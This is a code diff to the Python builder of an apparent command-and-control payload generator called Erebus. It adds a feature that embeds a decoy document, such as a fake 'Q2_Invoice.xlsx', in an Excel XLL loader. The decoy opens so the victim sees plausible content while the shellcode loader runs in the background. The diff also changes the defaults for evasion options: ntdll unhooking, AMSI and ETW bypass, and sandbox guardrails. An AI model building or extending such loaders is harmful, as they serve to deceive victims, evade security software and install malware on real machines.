@@ -518,6 +518,41 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         ),
 
         BuildParameter(
+            name = "0.2b XLL Ingest File",
+            group_name="2 - Windows Loader",
+            parameter_type = BuildParameterType.File,
+            description = (
+                "Optional: upload a legitimate file (e.g. a real .xlsx invoice) to embed in the XLL. "
+                "On xlAutoOpen the XLL drops this file to %%TEMP%% and opens it in Excel so the victim "
+                "sees plausible content while the loader executes in the background. "
+                "Leave empty to disable the ingestor."
+            ),
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.2 Loader Format", operand=HideConditionOperand.NotEQ, value="xll"),
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.2c XLL Ingest Filename",
+            group_name="2 - Windows Loader",
+            parameter_type = BuildParameterType.String,
+            description = (
+                "Filename used when dropping the embedded file to %%TEMP%% (e.g. 'Q2_Invoice.xlsx'). "
+                "Match the delivery pretext. Ignored when no ingest file is uploaded."
+            ),
+            default_value = "document.xlsx",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.2 Loader Format", operand=HideConditionOperand.NotEQ, value="xll"),
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
+            ]
+        ),
+
+        BuildParameter(
             name = "0.3 Loader Build Configuration",
             group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
@@ -1281,13 +1316,14 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             group_name="6 - Evasion",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
-                "DLL unhook breadth:\n"
-                "0 = ntdll only (default)\n"
-                "1 = ntdll + kernel32 + kernelbase\n"
-                "2 = Selective (targeted Nt* function list, lowest noise)"
+                "NTDLL unhook breadth:\n"
+                "0 = None (skip all unhooking)\n"
+                "1 = ntdll only (default)\n"
+                "2 = ntdll + kernel32 + kernelbase\n"
+                "3 = Selective (targeted Nt* function list, lowest noise)"
             ),
-            choices = ["0", "1", "2"],
-            default_value = "0",
+            choices = ["0", "1", "2", "3"],
+            default_value = "1",
             required = False,
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
@@ -4568,7 +4604,7 @@ generated if none have been entered.""",
                             sleep_obfuscation_jitter_ms=int(self.get_parameter("0.5r Sleep Jitter MS") or 3000),
                             amsi_bypass_type=int(self.get_parameter("0.5s AMSI Bypass Type") or 1),
                             etw_bypass_type=int(self.get_parameter("0.5t ETW Bypass Type") or 1),
-                            unhook_scope=int(self.get_parameter("0.5u Unhook Scope") or 0),
+                            unhook_scope=int(self.get_parameter("0.5u Unhook Scope") or 1),
                             guardrails_check_uptime=guardrails_check_uptime,
                             guardrails_uptime_min_seconds=guardrails_uptime_min_sec,
                             guardrails_check_screen_resolution=guardrails_check_screen_res,
@@ -4863,7 +4899,7 @@ generated if none have been entered.""",
                         _so_jitt = int(self.get_parameter("0.5r Sleep Jitter MS") or 3000)
                         _amsi    = int(self.get_parameter("0.5s AMSI Bypass Type") or 1)
                         _etw     = int(self.get_parameter("0.5t ETW Bypass Type") or 1)
-                        _unhook  = int(self.get_parameter("0.5u Unhook Scope") or 0)
+                        _unhook  = int(self.get_parameter("0.5u Unhook Scope") or 1)
                         cmd = [
                             "make",
                             "-C",
@@ -4889,6 +4925,54 @@ generated if none have been entered.""",
                         elif loader_format == "xll":
                             compile_step_name = "[T1559.002] - Compiling XLL Add-In"
                             compile_step_msg = "XLL Add-In Compiled!"
+
+                            # XLL File Ingestor: embed a legitimate document that is
+                            # dropped to %TEMP% and opened when xlAutoOpen fires.
+                            _xll_ingest_uuid = self.get_parameter("0.2b XLL Ingest File")
+                            if _xll_ingest_uuid:
+                                try:
+                                    _ingest_resp = await SendMythicRPCFileGetContent(
+                                        MythicRPCFileGetContentMessage(AgentFileId=_xll_ingest_uuid)
+                                    )
+                                    if _ingest_resp.Success and _ingest_resp.Content:
+                                        _ingest_bytes = _ingest_resp.Content
+
+                                        # Operator-chosen drop filename (e.g. "Q2_Invoice.xlsx").
+                                        _ingest_fname = (
+                                            self.get_parameter("0.2c XLL Ingest Filename") or "document.xlsx"
+                                        ).strip()
+                                        if not _ingest_fname:
+                                            _ingest_fname = "document.xlsx"
+
+                                        # Sanitise: no path separators, no quotes.
+                                        _ingest_fname = _ingest_fname.replace("/", "_").replace("\\", "_").replace('"', "")
+
+                                        # Convert bytes to C hex array and write
+                                        # the generated header (includes filename
+                                        # define so no shell-quoting gymnastics
+                                        # are needed on the make command line).
+                                        _hex_vals = ", ".join(f"0x{b:02X}" for b in _ingest_bytes)
+                                        _ingest_header = (
+                                            "#ifndef EREBUS_XLL_INGEST_FILE_HPP\n"
+                                            "#define EREBUS_XLL_INGEST_FILE_HPP\n"
+                                            "#pragma once\n"
+                                            "// Auto-generated by Erebus builder.py\n"
+                                            f'#define CONFIG_XLL_INGEST_FILENAME "{_ingest_fname}"\n'
+                                            f"static const unsigned char xll_ingest_file_data[] = {{ {_hex_vals} }};\n"
+                                            f"static const unsigned long xll_ingest_file_size   = {len(_ingest_bytes)};\n"
+                                            "#endif\n"
+                                        )
+                                        _ingest_hdr_path = (
+                                            Path(shellcode_loader_path) / "include" / "xll_ingest_file.hpp"
+                                        )
+                                        _ingest_hdr_path.write_text(_ingest_header)
+
+                                        cmd.insert(-1, "CONFIG_XLL_FILE_INGESTOR_ENABLED=1")
+                                        output += f"[+] XLL ingest file embedded: {_ingest_fname} ({len(_ingest_bytes)} bytes)\n"
+                                    else:
+                                        output += "[WARN] Failed to retrieve XLL ingest file content — ingestor disabled.\n"
+                                except Exception as _ie:
+                                    output += f"[WARN] XLL ingest file error: {_ie} — ingestor disabled.\n"
                         else:
                             compile_step_name = "[T1027] - Compiling Shellcode Loader"
                             compile_step_msg = "Shellcode Loader Compiled!"
